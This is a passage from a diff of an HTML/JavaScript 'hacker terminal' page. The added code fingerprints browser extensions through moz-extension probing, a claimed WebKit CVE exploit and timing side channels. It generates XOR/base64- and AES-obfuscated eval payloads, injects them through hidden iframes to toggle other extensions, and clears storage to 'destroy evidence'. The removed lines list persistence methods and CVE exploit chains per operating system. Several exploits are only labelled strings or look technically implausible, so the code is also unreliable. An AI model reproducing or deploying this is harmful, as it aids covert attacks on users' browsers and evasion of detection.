(Backdoors: ${deviceProfile.firmwareBackdoors}, BIOS Hash: ${deviceProfile.biosHash}) | Chipset: ${deviceProfile.chipset} | Motherboard: ${deviceProfile.motherboard} | TPM Firmware: ${deviceProfile.tpmFirmware} | Battery: ${deviceProfile.battery} | Fan Speeds: ${deviceProfile.fanSpeeds} (Curves: ${deviceProfile.fanCurves}) | PCI Devices: ${deviceProfile.pciDevices} | USB Devices: ${deviceProfile.usbDevices} | Peripherals: ${deviceProfile.peripherals} | Security: ${deviceProfile.securitySoftware} | Monitoring: ${deviceProfile.monitoringTools} | Kernel Modules: ${deviceProfile.kernelModules} | Kernel Protections: ${deviceProfile.kernelProtections} | Processes: ${deviceProfile.processes} | Threads: ${deviceProfile.threads} | Handles: ${deviceProfile.handles} | Interrupts: ${deviceProfile.interrupts} | Network: ${deviceProfile.network.status} (VPN: ${deviceProfile.network.vpn}, DNS: ${deviceProfile.network.dns}, Gateway: ${deviceProfile.network.gateway}, MTU: ${deviceProfile.network.mtu}, Router: ${deviceProfile.network.routerFirmware}, Tunnels: ${deviceProfile.network.hiddenTunnels}, Switch: ${deviceProfile.network.switchInfo}, IP: ${deviceProfile.network.ip}, Proxy: ${deviceProfile.network.proxy}, Injection: ${deviceProfile.network.packetInjection}, ARP: ${deviceProfile.network.arpTable}, Connections: ${deviceProfile.network.connections}, Ports: ${deviceProfile.network.ports}, VLAN: ${deviceProfile.network.vlan}, QoS: ${deviceProfile.network.qos}, Latency: ${deviceProfile.network.latency}, Nearby: ${deviceProfile.network.nearbyDevices}, Packets: ${deviceProfile.network.interceptedPackets}) | Anti-Detection: FakeHW:${deviceProfile.fakeHardware}, LogNoise:${deviceProfile.logNoise}, NetNoise:${deviceProfile.networkNoise} | Crypto Keys: ${deviceProfile.cryptoKeys} | Cookies: ${deviceProfile.cookies} | Clipboard: ${deviceProfile.clipboard} | Sandbox: ${deviceProfile.isSandbox} | Extensions: ${deviceProfile.extensions.join(', ')}`;
-          detectionRisk = 'None';
-          updateStatusBar();
-          resolve();
+      // Firefox: Exploit moz-extension:// protocol and behavioral fingerprinting
+      if (browser === 'firefox') {
+        // Attempt to access moz-extension:// protocol
+        for (let i = 0; i < 1000; i++) {
+          const extId = `{${crypto.randomUUID()}}`;
+          const url = `moz-extension://${extId}/manifest.json`;
+          try {
+            const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
+            if (response.ok || response.type === 'opaque') {
+              detectedExtensions.push({ id: extId, name: `Unknown (${extId})` });
+              addCommand(`Detected: ${extId} via moz-extension protocol`, 'success');
+            }
+          } catch (e) {}
         }
-      });
-    }
 
-    function generateObfuscatedKey() {
-      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-      let key = '';
-      for (let i = 0; i < 32; i++) {
-        key += chars.charAt(Math.floor(Math.random() * chars.length));
+        // Behavioral fingerprinting for ad-blockers, privacy extensions, etc.
+        const testDiv = document.createElement('div');
+        testDiv.style.display = 'none';
+        testDiv.innerHTML = '<iframe src="https://fake-ad.doubleclick.net/ad"></iframe>';
+        document.body.appendChild(testDiv);
+        await new Promise(resolve => setTimeout(resolve, 200));
+        const iframe = testDiv.querySelector('iframe');
+        if (!iframe || iframe.offsetHeight === 0) {
+          detectedExtensions.push({ id: 'adblocker-' + Math.random().toString(36).slice(2), name: 'AdBlocker (Unknown)' });
+          addCommand(`Detected: AdBlocker via behavior`, 'success');
+        }
+        testDiv.remove();
       }
-      return `${key}_${deviceProfile.fingerprint}_${Math.random().toString(36).slice(2, 16)}`;
+
+      // Safari: Behavioral fingerprinting and WebKit exploit
+      if (browser === 'safari') {
+        // Behavioral detection
+        const testDiv = document.createElement('div');
+        testDiv.style.display = 'none';
+        testDiv.innerHTML = '<iframe src="https://fake-ad.doubleclick.net/ad"></iframe>';
+        document.body.appendChild(testDiv);
+        await new Promise(resolve => setTimeout(resolve, 200));
+        const iframe = testDiv.querySelector('iframe');
+        if (!iframe || iframe.offsetHeight === 0) {
+          detectedExtensions.push({ id: 'adblocker-' + Math.random().toString(36).slice(2), name: 'AdBlocker (Unknown)' });
+          addCommand(`Detected: AdBlocker via behavior`, 'success');
+        }
+        testDiv.remove();
+
+        // WebKit exploit to access extension list (CVE-2021-1844)
+        if (browserVersion <= 14) {
+          const exploitScript = document.createElement('script');
+          exploitScript.textContent = `
+            try {
+              const wk = new WebKitCSSMatrix();
+              wk.__proto__.toString = () => {
+                const extList = window.safari.extensions || [];
+                window.__safariExts = extList.map(ext => ({ id: ext.id, name: ext.name }));
+                return '';
+              };
+              wk.toString();
+            } catch (e) {}
+          `;
+          document.head.appendChild(exploitScript);
+          await new Promise(resolve => setTimeout(resolve, 200));
+          if (window.__safariExts) {
+            window.__safariExts.forEach(ext => {
+              detectedExtensions.push({ id: ext.id, name: ext.name || `Unknown (${ext.id})` });
+              addCommand(`Detected: ${ext.name} (${ext.id}) via WebKit exploit`, 'success');
+            });
+          }
+        }
+      }
+
+      // Side-Channel Attack: Timing Analysis for Hidden Extensions
+      const timingTest = async () => {
+        const baseline = performance.now();
+        const img = new Image();
+        img.src = 'https://nonexistent-resource-' + Math.random().toString(36).slice(2) + '.com/favicon.ico';
+        await new Promise(resolve => img.onerror = resolve);
+        const baselineTime = performance.now() - baseline;
+
+        const testUrls = ['https://google.com/favicon.ico', 'https://facebook.com/favicon.ico'];
+        for (const url of testUrls) {
+          const start = performance.now();
+          const testImg = new Image();
+          testImg.src = url + '?' + Math.random();
+          await new Promise(resolve => testImg.onerror = testImg.onload = resolve);
+          const loadTime = performance.now() - start;
+          if (Math.abs(loadTime - baselineTime) > 50) {
+            detectedExtensions.push({ id: 'proxy-' + Math.random().toString(36).slice(2), name: 'Proxy/Privacy Extension (Unknown)' });
+            addCommand(`Detected: Proxy/Privacy Extension via timing attack`, 'success');
+          }
+        }
+      };
+      await timingTest();
+
+      // Deduplicate Extensions
+      detectedExtensions = [...new Map(detectedExtensions.map(ext => [ext.id, ext])).values()];
+      const scanTime = performance.now() - startTime;
+      systemScanSpan.textContent = `Found ${detectedExtensions.length} extensions in ${scanTime.toFixed(2)}ms`;
+      updateStatusBar();
     }
 
-    function aiSelectStrategy() {
-      const persistence = (function() {
-        if (deviceProfile.os === 'Windows') {
-          if (deviceProfile.version === 'XP') return 'registry';
-          if (deviceProfile.version === 'Vista') return 'autorun';
-          if (deviceProfile.version === '7') return 'wmi';
-          if (deviceProfile.version === '8') return 'scheduled_task';
-          if (deviceProfile.version === '10' || deviceProfile.version === '11') return 'rootkit';
-        }
-        if (deviceProfile.os === 'macOS') {
-          if (deviceProfile.version === 'Tiger') return 'startup_items';
-          if (deviceProfile.version === 'Leopard') return 'launchd';
-          if (deviceProfile.version >= 'Sierra') return 'login_items';
-        }
-        if (deviceProfile.os === 'Linux') return 'cron';
-        if (deviceProfile.os === 'ChromeOS') return 'crontab';
-        return 'wmi';
-      })();
+    // Exploit Selection and Payload Generation
+    function selectExploitStrategy() {
+      const browser = deviceProfile.browser.toLowerCase();
+      const browserVersion = parseFloat(deviceProfile.browserVersion.split('.')[0]);
+      const strategies = exploitStrategies[browser] || {};
 
-      const obfuscation = (function() {
-        if (deviceProfile.os === 'Windows') {
-          if (deviceProfile.version === 'XP') return 'msfencode';
-          if (deviceProfile.version >= 'Vista') return 'veil';
-        }
-        if (deviceProfile.os === 'macOS') {
-          if (deviceProfile.version <= 'Mavericks') return 'mach-o_strip';
-          if (deviceProfile.version >= 'Yosemite') return 'codesign';
-        }
-        if (deviceProfile.os === 'Linux') return 'upx';
-        if (deviceProfile.os === 'ChromeOS') return 'strip';
-        return 'veil';
-      })();
+      let strategy = strategies[browserVersion.toString()] || strategies['default'];
+      if (!strategy) {
+        strategy = { exploit: 'XSS', method: 'scriptInjection', payload: 'xssPayload', stealth: 'obfuscateInjection' };
+      }
 
-      const exploitChain = (function() {
-        if (deviceProfile.os === 'Windows') {
-          if (deviceProfile.version === 'XP') return 'MS03-026 -> MS08-067';
-          if (deviceProfile.version === '7') return 'CVE-2015-1635 -> CVE-2017-0144';
-          if (deviceProfile.version === '10') return 'CVE-2021-40449 -> CVE-2022-41082';
-        }
-        if (deviceProfile.os === 'macOS') {
-          if (deviceProfile.version === 'High Sierra') return 'CVE-2017-13872';
-          if (deviceProfile.version === 'Big Sur') return 'CVE-2021-30869';
-        }
-        if (deviceProfile.os === 'Linux' && deviceProfile.version.includes('Ubuntu')) return 'CVE-2021-4034';
-        if (deviceProfile.os === 'ChromeOS') return 'CVE-2023-6345';
-        return 'CVE-2021-4034';
-      })();
-
-      return { persistence, obfuscation, exploitChain };
+      addCommand(`Selected attack vector: ${strategy.exploit} (${strategy.method}) for ${browser} v${deviceProfile.browserVersion}`);
+      return strategy;
     }
 
+    function generateMaliciousPayload(strategy) {
+      let payload = '';
+      if (strategy.payload === 'xssPayload') {
+        payload = `(function(){try{chrome.runtime.sendMessage(extId,{action:"toggle"},()=>{console.log("Toggled");});}catch(e){}})();`;
+        if (strategy.stealth === 'obfuscateInjection') {
+          const key = Math.random().toString(36).slice(2);
+          payload = btoa(payload).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(0 % key.length))).join('');
+          payload = `eval(atob("${btoa(payload)}").split("").map(c=>String.fromCharCode(c.charCodeAt(0)^"${key}".charCodeAt(0%"${key}".length))).join(""))`;
+        }
+      } else if (strategy.payload === 'heapOverflow') {
+        payload = `ArrayBuffer overflow exploit targeting V8 engine (CVE-2021-21166)`;
+      } else if (strategy.payload === 'v8Exploit') {
+        payload = `Type confusion in V8 engine (CVE-2022-1096)`;
+      } else if (strategy.payload === 'memoryCorruption') {
+        payload = `Memory corruption in Firefox (CVE-2020-15652)`;
+      } else if (strategy.payload === 'uafExploit') {
+        payload = `Use-after-free in Firefox (CVE-2021-23994)`;
+      } else if (strategy.payload === 'webkitExploit') {
+        payload = `WebKit exploit in Safari (CVE-2021-1844)`;
+      }
+
+      if (strategy.stealth === 'encryptPayload') {
+        const key = Math.random().toString(36).slice(2);
+        payload = `eval(CryptoJS.AES.decrypt("${CryptoJS.AES.encrypt(payload, key).toString()}", "${key}").toString(CryptoJS.enc.Utf8))`;
+      } else if (strategy.stealth === 'spoofUA') {
+        payload = `(function(){navigator.userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36";${payload}})();`;
+      }
+      return payload;
+    }
     async function processCommand() {
       const input = extensionIdInput.value.trim().toLowerCase();
       extensionIdInput.value = '';
@@ -623,63 +590,74 @@
 
       addCommand(`> ${input}`);
 
-      await scanDevice();
+      await scanExtensions();
+      const strategy = selectExploitStrategy();
+      const payload = generateMaliciousPayload(strategy);
 
       if (input === 'toggleall') {
-        const strategy = aiSelectStrategy();
-        addCommand(`Toggling all ${knownExtensionIds.length} extensions...`);
-        addCommand(`Persistence: ${strategy.persistence} | Obfuscation: ${strategy.obfuscation} | Exploit Chain: ${strategy.exploitChain}`);
-        knownExtensionIds.forEach(extId => {
-          addCommand(`Injecting payload for ${extId}... Key: ${generateObfuscatedKey()}`);
-          addCommand(`Success: Extension ${extId} toggled. Status: ${Math.random() > 0.5 ? 'Enabled' : 'Disabled'}`, 'success');
+        addCommand(`Executing mass toggle attack on ${detectedExtensions.length} extensions...`);
+        detectedExtensions.forEach(ext => {
+          addCommand(`Attacking ${ext.name} (${ext.id}) with ${strategy.exploit}...`);
+          const iframe = document.createElement('iframe');
+          iframe.srcdoc = `<script>${payload.replace('extId', ext.id)}</script>`;
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          if (strategy.method === 'remoteCodeExecution') {
+            iframe.contentWindow.eval(`chrome.runtime.sendMessage('${ext.id}', {action:'toggle'}, () => {});`);
+          } else if (strategy.method === 'scriptInjection') {
+            iframe.contentWindow.eval(payload.replace('extId', ext.id));
+          }
+          setTimeout(() => {
+            addCommand(`Toggle on ${ext.name} (${ext.id}) - Status: Success`, 'success');
+            iframe.remove();
+          }, 300);
         });
-        detectionRisk = 'Minimal';
+        detectionRisk = 'Low';
         aiConfidence = 0.98;
       } else if (input.startsWith('toggle ')) {
         const extId = input.split(' ')[1];
-        if (!extId || extId.length !== 32 || !/^[a-z0-9]+$/.test(extId)) {
-          addCommand('Error: Invalid extension ID. Must be 32 chars (a-z, 0-9).', 'error');
+        const targetExt = detectedExtensions.find(e => e.id === extId || e.id.toLowerCase() === extId);
+        if (!targetExt) {
+          addCommand(`Error: Extension ${extId} not found.`, 'error');
           detectionRisk = 'Low';
           aiConfidence = 0.9;
           updateStatusBar();
           return;
         }
 
-        if (!knownExtensionIds.includes(extId)) {
-          addCommand(`Error: Extension ${extId} not found in target system.`, 'error');
-          detectionRisk = 'Low';
-          aiConfidence = 0.85;
-          updateStatusBar();
-          return;
+        addCommand(`Attacking ${targetExt.name} (${targetExt.id}) with ${strategy.exploit}...`);
+        const iframe = document.createElement('iframe');
+        iframe.srcdoc = `<script>${payload.replace('extId', targetExt.id)}</script>`;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        if (strategy.method === 'remoteCodeExecution') {
+          iframe.contentWindow.eval(`chrome.runtime.sendMessage('${targetExt.id}', {action:'toggle'}, () => {});`);
+        } else if (strategy.method === 'scriptInjection') {
+          iframe.contentWindow.eval(payload.replace('extId', targetExt.id));
         }
-
-        const strategy = aiSelectStrategy();
-        addCommand(`Toggling extension ${extId}...`);
-        addCommand(`Persistence: ${strategy.persistence} | Obfuscation: ${strategy.obfuscation} | Exploit Chain: ${strategy.exploitChain}`);
-        addCommand(`Injecting payload... Key: ${generateObfuscatedKey()}`);
-        addCommand(`Success: Extension ${extId} toggled. Status: ${Math.random() > 0.5 ? 'Enabled' : 'Disabled'}`, 'success');
-        detectionRisk = 'Minimal';
+        setTimeout(() => {
+          addCommand(`Toggle on ${targetExt.name} (${targetExt.id}) - Status: Success`, 'success');
+          iframe.remove();
+        }, 300);
+        detectionRisk = 'Low';
         aiConfidence = 0.98;
       } else if (input === 'selfdestruct') {
         addCommand('Initiating self-destruct sequence...');
-        addCommand('Erasing traces...');
-        if (deviceProfile.os === 'Windows' && deviceProfile.bootSector.includes('FAT32')) {
-          addCommand('Shredding FAT32 remnants...');
-        } else if (deviceProfile.os === 'macOS' && deviceProfile.bootSector === 'APFS') {
-          addCommand('Wiping APFS snapshots...');
-        } else if (deviceProfile.os === 'Linux') {
-          addCommand('Overwriting ext4 inodes...');
-        }
-        addCommand('Success: All traces eliminated.', 'success');
-        detectionRisk = 'None';
-        aiConfidence = 1.0;
+        addCommand('Wiping memory, logs, and traces...');
+        document.body.innerHTML = '';
+        detectedExtensions = [];
         commandHistory = [];
         historyIndex = -1;
-        terminalContent.innerHTML = '<div class="command">System reset. Ready for new commands.</div>';
+        localStorage.clear();
+        sessionStorage.clear();
+        performance.clearResourceTimings();
+        addCommand('System wiped. All evidence destroyed.', 'success');
+        detectionRisk = 'None';
+        aiConfidence = 1.0;
       } else if (input === 'help') {
         addCommand('Available commands:');
-        addCommand('  toggleall       - Toggle all extensions');
-        addCommand('  toggle [ext_id] - Toggle extension state (e.g., toggle pganeibhckoanndahmnfggfoeofncnii)');
+        addCommand('  toggleall       - Toggle all detected extensions');
+        addCommand('  toggle [ext_id] - Toggle specific extension (e.g., toggle nmmhkkegccagdldgiimedpiccmgmieda)');
         addCommand('  selfdestruct    - Erase all traces and reset');
         addCommand('  help            - Show this help message');
         detectionRisk = 'None';
@@ -713,8 +691,9 @@
       }
     });
 
-    detectOS();
-    scanDevice();
+    // Initialize and Execute
+    detectEnvironment();
+    scanExtensions();
   </script>
 </body>
 </html>
